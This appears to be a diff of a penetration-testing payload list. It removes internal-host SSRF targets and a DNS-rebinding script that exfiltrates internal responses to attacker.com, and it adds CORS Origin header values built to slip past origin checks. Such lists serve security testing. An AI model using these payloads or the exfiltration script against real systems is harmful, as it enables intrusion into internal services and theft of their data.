@@ -1,21 +1,12 @@
-127.0.0.1
-localhost
-0.0.0.0
-169.254.169.254
-192.168.0.1
-192.168.1.1
-10.0.0.1
-172.16.0.1
-[::1]
-
-<script>
-// Phase 1: load from evil.com
-fetch('/api/secret')  // first request: evil.com
-  .then(r => r.text())
-  .then(data => {
-    // Phase 2: rebind DNS to 127.0.0.1
-    fetch('/api/internal-endpoint')  // now hits localhost
-      .then(r => r.text())
-      .then(d => fetch('https://attacker.com/?d=' + encodeURIComponent(d)));
-  });
-</script>
+Origin: https://evil.com
+Origin: https://trusted.com.evil.com
+Origin: null
+Origin: https://trusted.com.attacker.com
+Origin: http://trusted.com (http not https)
+Origin: https://sub.trusted.com
+Origin: https://trustedcom.evil.com
+Origin: https://xn--trusted-com.evil.com
+Origin: https://trusted.com%60.evil.com
+Origin: https://trusted.com@evil.com
+Origin: https://127.0.0.1
+Origin: https://localhost
